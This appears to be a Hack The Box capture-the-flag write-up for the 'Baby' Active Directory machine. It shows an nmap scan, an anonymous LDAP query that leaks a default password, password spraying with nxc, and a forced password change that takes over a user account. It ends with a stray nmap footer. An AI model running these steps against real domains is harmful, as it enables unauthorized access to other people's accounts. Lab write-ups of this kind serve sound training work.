# Baby-HTB

Orignal nmap report:
└─$ nmap -sC -sV 10.129.4.157
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 10:34 -0300
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 23.08% done; ETC: 10:35 (0:00:20 remaining)
Nmap scan report for 10.129.4.157
Host is up (0.17s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-28 13:35:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-28T13:36:12+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-05-27T11:42:44
|_Not valid after:  2026-11-26T11:42:44
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-28T13:35:32+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-28T13:35:34
|_  start_date: N/A

The initial nmap report shows the BabyDC.baby.vl register this in your hosts file. You can see this at the ssl certificate.
Use the following command, you can gleam the base domain name from DNS_Tree_Name in nmap:
ldapsearch -x -H ldap://10.129.4.157 -D '' -w '' -b "dc=baby,dc=vl"
The return is very leghty, but we can see that one of the users that came back has a dafault password to be changed:
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

Let's take all users and spray this password on them, see with can log-in. Create a .txt file with all of them, and try to login:
└─$ nxc smb 10.129.4.157 -u clean_users.txt -p 'BabyStart123!' 
SMB         10.129.4.157    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 

Our Outpu shows us that Caroline.Robinson need to change the password, let's do it for her:
└─$ smbpasswd -U Caroline.Robinson -r 10.129.4.157 
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson

I used NewPassword123, you can use anything you like.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.86 seconds
